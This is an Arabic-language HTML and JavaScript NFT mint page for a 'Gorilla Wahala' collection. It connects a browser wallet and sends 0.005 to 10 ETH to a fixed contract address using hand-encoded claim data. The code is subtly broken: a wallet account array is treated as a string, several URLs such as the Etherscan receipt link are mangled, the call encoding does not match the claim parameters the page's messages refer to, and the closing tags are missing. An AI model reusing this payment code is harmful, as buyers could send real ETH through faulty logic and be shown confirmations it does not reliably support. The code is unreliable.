<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gorilla Wahala - Official NFT Mint</title>
    <style>
        * { box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background-color: #0f0f1a; color: white; text-align: center; padding-top: 80px; }
        header { position: fixed; top: 0; width: 100%; padding: 15px 30px; background-color: rgba(15, 15, 26, 0.95); border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; z-index: 100; }
        .logo { font-size: 1.5rem; font-weight: bold; color: #00b4d8; }
        .btn-connect { background-color: #7b2cbf; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.3s; }
        .btn-connect:hover { background-color: #9d4edd; }
        .container { max-width: 1200px; margin: 40px auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; padding: 20px; }
        .card { background-color: #1a1a2e; border-radius: 15px; border: 1px solid #333; overflow: hidden; transition: transform 0.3s; }
        .card:hover { transform: translateY(-5px); border-color: #7b2cbf; }
        .card img { width: 100%; height: 320px; object-fit: cover; background-color: #252542; display: block; }
        .card-body { padding: 20px; }
        .price { font-size: 1.3rem; color: #00b4d8; margin: 10px 0 20px; font-weight: bold; }
        .btn-buy { background: linear-gradient(45deg, #7b2cbf, #00b4d8); width: 100%; padding: 15px; border: none; border-radius: 8px; color: white; cursor: pointer; font-weight: bold; font-size: 1rem; transition: 0.3s; }
        .btn-buy:disabled { opacity: 0.6; cursor: not-allowed; }
        .status { margin-top: 12px; color: #ccc; font-size: 0.9rem; min-height: 24px; line-height: 1.6; }
        .receipt-box { background: #122620; border: 1px solid #06d6a0; border-radius: 8px; padding: 12px; margin-top: 12px; font-size: 0.85rem; text-align: right; word-break: break-word; }
        .badge-confirmed { display: inline-block; background: #06d6a0; color: #0f0f1a; padding: 3px 8px; border-radius: 4px; font-weight: bold; margin-bottom: 6px; }
    </style>
</head>
<body>

<header>
    <div class="logo">Gorilla Wahala</div>
    <button id="connectBtn" class="btn-connect">ربط محفظة المشتري</button>
</header>

<div class="container">
    <!-- Token ID 0 -->
    <div class="card">
        <img src="1.png" onerror="this.src='https://imgur.com'" alt="Gorilla Starter">
        <div class="card-body">
            <h2>Gorilla Starter #01</h2>
            <div class="price">0.005 ETH</div>
            <button class="btn-buy" onclick="mintNFT(0, '0.005', 'Gorilla Starter #01', this)">شراء واستلام NFT فوراً</button>
            <div class="status"></div>
        </div>
    </div>

    <!-- Token ID 1 -->
    <div class="card">
        <img src="2.png" onerror="this.src='https://imgur.com'" alt="Gorilla Premium">
        <div class="card-body">
            <h2>Gorilla Premium #02</h2>
            <div class="price">4 ETH</div>
            <button class="btn-buy" onclick="mintNFT(1, '4', 'Gorilla Premium #02', this)">شراء واستلام NFT فوراً</button>
            <div class="status"></div>
        </div>
    </div>

    <!-- Token ID 2 -->
    <div class="card">
        <img src="3.png" onerror="this.src='https://imgur.com'" alt="Gorilla Elite">
        <div class="card-body">
            <h2>Gorilla Elite #03</h2>
            <div class="price">10 ETH</div>
            <button class="btn-buy" onclick="mintNFT(2, '10', 'Gorilla Elite #03', this)">شراء واستلام NFT فوراً</button>
            <div class="status"></div>
        </div>
    </div>
</div>

<script>
    const NFT_CONTRACT_ADDRESS = "0x2A0D651e94F5b37E486E4bb4E654C1Bf9e1D4a33";
    const ETHEREUM_MAINNET_CHAIN_ID = "0x1";
    let buyerAccount = null;

    function ethToHexWei(ethString) {
        const [whole, fraction = ""] = ethString.split(".");
        const paddedFraction = fraction.padEnd(18, "0").slice(0, 18);
        const weiBigInt = BigInt(whole) * (10n ** 18n) + BigInt(paddedFraction);
        return "0x" + weiBigInt.toString(16);
    }

    function encodeClaimCall(receiverAddress, tokenId, quantity) {
        const selector = "57bc3d78";
        const cleanAddr = receiverAddress.toLowerCase().replace("0x", "").padStart(64, "0");
        const hexTokenId = BigInt(tokenId).toString(16).padStart(64, "0");
        const hexQuantity = BigInt(quantity).toString(16).padStart(64, "0");
        return "0x" + selector + cleanAddr + hexTokenId + hexQuantity;
    }

    async function connectBuyerWallet() {
        if (typeof window.ethereum === 'undefined') {
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            if (isMobile) {
                const currentUrl = window.location.href.replace(/^https?:\/\//, '');
                window.location.href = "https://app.link" + currentUrl;
            } else {
                alert("يرجى تثبيت إضافة محفظة MetaMask أو Trust Wallet على متصفحك لإتمام الشراء.");
            }
            return null;
        }

        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            if (!accounts || accounts.length === 0) {
                alert("يرجى فتح قفل محفظتك (Unlock) أولاً.");
                return null;
            }

            buyerAccount = accounts;

            const connectBtn = document.getElementById('connectBtn');
            connectBtn.innerText = "محفظتك: " + buyerAccount.substring(0, 6) + "..." + buyerAccount.substring(38);
            connectBtn.style.backgroundColor = "#2b9348";

            const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
            if (currentChainId !== ETHEREUM_MAINNET_CHAIN_ID) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: ETHEREUM_MAINNET_CHAIN_ID }],
                    });
                } catch (switchError) {
                    alert("يرجى تحويل الشبكة داخل محفظتك إلى Ethereum Mainnet.");
                    return null;
                }
            }
            return buyerAccount;
        } catch (err) {
            console.error(err);
            alert("يرجى فتح قفل المحفظة والموافقة على الاتصال.");
            return null;
        }
    }

    document.getElementById('connectBtn').addEventListener('click', connectBuyerWallet);

    async function waitForMintConfirmation(txHash, statusDiv, nftName, priceEth) {
        statusDiv.style.color = "#00b4d8";
        statusDiv.innerHTML = `⏳ جاري تسجيل الـ NFT على بلوكشين الإيثيريوم وتحويله لمحفظتك...<br><small>Tx: ${txHash.substring(0, 14)}...</small>`;

        const checkInterval = setInterval(async () => {
            try {
                const receipt = await window.ethereum.request({
                    method: 'eth_getTransactionReceipt',
                    params: [txHash],
                });

                if (receipt && receipt.blockNumber) {
                    clearInterval(checkInterval);
                    const blockNum = parseInt(receipt.blockNumber, 16);

                    if (receipt.status === "0x1") {
                        statusDiv.style.color = "#06d6a0";
                        statusDiv.innerHTML = `
                            <div class="receipt-box">
                                <span class="badge-confirmed">✔ تم الشراء ونقل الـ NFT لمحفظتك (Block #${blockNum})</span><br>
                                • <b>القطعة المشتراة:</b> ${nftName}<br>
                                • <b>المبلغ المدفوع:</b> ${priceEth} ETH<br>
                                • ستظهر الصورة الآن في تبويب <b>NFTs</b> داخل محفظتك.<br>
                                • <a href="https://etherscan.io{txHash}" target="_blank" style="color:#00b4d8; text-decoration:underline; font-weight:bold;">
                                    عرض إثبات ملكية الـ NFT على Etherscan ↗
                                  </a>
                            </div>
                        `;
                        alert(`تهانينا! تم شراء (${nftName}) وتحويل الصورة إلى محفظتك تلقائياً.`);
                    } else {
                        statusDiv.style.color = "#ef476f";
                        statusDiv.textContent = "فشلت المعاملة على الشبكة: تأكد من تفعيل مرحلة البيع (Claim Conditions) والكمية في العقد.";
                    }
                }
            } catch (e) {
                console.error("Error checking receipt:", e);
            }
        }, 3000);
    }

    async function mintNFT(tokenId, priceEth, nftName, btnElement) {
        const statusDiv = btnElement.parentElement.querySelector('.status');
        const account = await connectBuyerWallet();
        if (!account) return;

        try {
            btnElement.disabled = true;
            statusDiv.style.color = "#ffd166";
            statusDiv.textContent = "افتح محفظتك لتأكيد شراء واستلام " + nftName + "...";

            const hexValue = ethToHexWei(priceEth);
            const callData = encodeClaimCall(account, tokenId, 1);

            const txHash = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [{
                    from: account,
                    to: NFT_CONTRACT_ADDRESS,
                    value: hexValue,
                    data: callData
                }]
            });

            await waitForMintConfirmation(txHash, statusDiv, nftName, priceEth);

        } catch (err) {
            console.error(err);
            statusDiv.style.color = "#ef476f";
if (err.code === 4001) {
statusDiv.textContent = "تم إلغاء عملية الشراء من قبلك.";
} else {
statusDiv.textContent = "تعذر إتمام الشراء: تأكد من توفر رصيد ETH كافٍ وتفعيل السعر في Thirdweb.";
}
} finally {
btnElement.disabled = false;
}
}
